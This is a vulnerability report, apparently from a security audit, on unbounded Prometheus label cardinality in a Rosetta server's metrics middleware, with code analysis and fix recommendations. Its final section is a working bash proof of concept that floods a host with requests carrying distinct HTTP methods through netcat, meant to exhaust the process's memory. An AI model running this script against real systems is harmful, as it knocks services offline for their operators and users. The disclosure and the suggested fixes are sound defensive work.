### Title
Prometheus Label Cardinality Exhaustion via Arbitrary HTTP Method Strings in MetricsMiddleware

### Summary
`MetricsMiddleware` in `rosetta/app/middleware/metrics.go` passes the raw `r.Method` value directly to four unbounded Prometheus metric vectors as a label. An unauthenticated attacker can send HTTP requests with thousands of distinct, arbitrary method strings, causing unbounded growth of Prometheus label cardinality and eventual heap memory exhaustion (OOM) of the Rosetta process.

### Finding Description

**Exact code path:**

In `rosetta/app/middleware/metrics.go` lines 76–84, `MetricsMiddleware` wraps the router with `middleware.Instrument` from `github.com/weaveworks/common/middleware`:

```go
func MetricsMiddleware(next http.Handler) http.Handler {
    return middleware.Instrument{
        Duration:         requestDurationHistogram,
        InflightRequests: requestInflightGauge,
        RequestBodySize:  requestBytesHistogram,
        ResponseBodySize: responseBytesHistogram,
        RouteMatcher:     next.(middleware.RouteMatcher),
    }.Wrap(next)
}
```

The four metric vectors all declare `"method"` as a label dimension (lines 26, 32, 37, 43). The weaveworks `Instrument.Wrap()` implementation uses `r.Method` verbatim as the label value — no normalization, no allowlist.

**Middleware chain order** (from `rosetta/main.go` lines 217–219):
```
corsMiddleware → tracingMiddleware → metricsMiddleware → router
```

`MetricsMiddleware` sits *before* the router. Even when the router returns 405 (Method Not Allowed) or 404, the metric label has already been recorded with the attacker-controlled method string.

**Root cause:** The failed assumption is that only standard HTTP methods (GET, POST, PUT, DELETE, etc.) will ever appear as `r.Method`. Go's `net/http` server accepts any RFC 7230 token as a method — there is no built-in restriction to known methods. The `corsMiddleware` (`server.CorsMiddleware` from coinbase rosetta-sdk-go, backed by `github.com/rs/cors`) does not reject requests based on HTTP method for non-preflight requests; it passes them through.

**Why existing checks fail:** There are no checks. No method allowlist, no normalization to a canonical set, no rate limiting on distinct label values, and no Prometheus cardinality cap configured.

### Impact Explanation

Each unique `(method, route)` pair creates new time series in all four metric vectors:
- `requestBytesHistogram`: 5 buckets + `_sum` + `_count` = 7 series per pair
- `requestDurationHistogram`: 6 buckets + `_sum` + `_count` = 8 series per pair (plus `status_code`, `ws` dimensions)
- `requestInflightGauge`: 1 series per pair
- `responseBytesHistogram`: 7 series per pair

Sending 10,000 distinct method strings to a single route creates ~230,000+ time series. At ~3–5 KB per Prometheus time series in memory, this reaches ~1 GB of heap allocation. The Prometheus client library holds all active label combinations in memory indefinitely (they are never evicted). This causes OOM termination of the Rosetta process — a complete denial of service with no recovery until restart, and the attack can be immediately repeated.

### Likelihood Explanation

The Rosetta API is a public HTTP endpoint (default port from config, no authentication required for API calls). The attack requires only the ability to send TCP connections with crafted HTTP request lines — achievable with `curl`, `netcat`, or any HTTP client. No credentials, tokens, or prior knowledge of the system are needed. The attack is fully automatable: a simple loop generating random method strings at high rate can exhaust memory within minutes. It is repeatable across restarts.

### Recommendation

1. **Normalize the method label** before it reaches Prometheus. In `MetricsMiddleware`, wrap the handler to replace unrecognized methods with a sentinel value (e.g., `"unknown"`) before delegating to `middleware.Instrument`:

```go
var allowedMethods = map[string]bool{
    "GET": true, "POST": true, "PUT": true,
    "DELETE": true, "PATCH": true, "HEAD": true, "OPTIONS": true,
}

func normalizeMethod(m string) string {
    if allowedMethods[m] {
        return m
    }
    return "unknown"
}
```

Then either subclass the request before passing to `Instrument`, or use a custom `http.Handler` wrapper that rewrites `r.Method` to the normalized value before calling the next handler.

2. **Alternatively**, replace `middleware.Instrument` with a custom instrumentation handler that explicitly normalizes the method label before calling `With(prometheus.Labels{...})`.

3. **Add a method-filtering middleware** early in the chain (before `metricsMiddleware`) that rejects requests with non-standard HTTP methods with `405 Method Not Allowed`, preventing them from ever reaching the metrics layer.

### Proof of Concept

```bash
#!/bin/bash
# Send 50,000 requests with distinct HTTP method strings to exhaust Prometheus label cardinality
ROSETTA_HOST="localhost"
ROSETTA_PORT="8080"

for i in $(seq 1 50000); do
    METHOD="METHOD${i}"
    # Use netcat or curl's --request flag (curl normalizes, use netcat for raw)
    printf "${METHOD} /network/list HTTP/1.1\r\nHost: ${ROSETTA_HOST}\r\nContent-Length: 0\r\n\r\n" \
        | nc -q1 ${ROSETTA_HOST} ${ROSETTA_PORT} > /dev/null 2>&1 &
    # Throttle slightly to avoid TCP exhaustion
    if (( i % 100 == 0 )); then wait; fi
done
wait

echo "Monitor rosetta process RSS: watch -n1 'ps aux | grep rosetta'"
echo "Each unique method creates new Prometheus time series; OOM expected after sufficient iterations."
```

Each iteration creates new `(METHOD${i}, route)` label combinations across all four metric vectors. Memory usage grows monotonically. The process will be OOM-killed by the OS or become unresponsive as GC pressure increases.
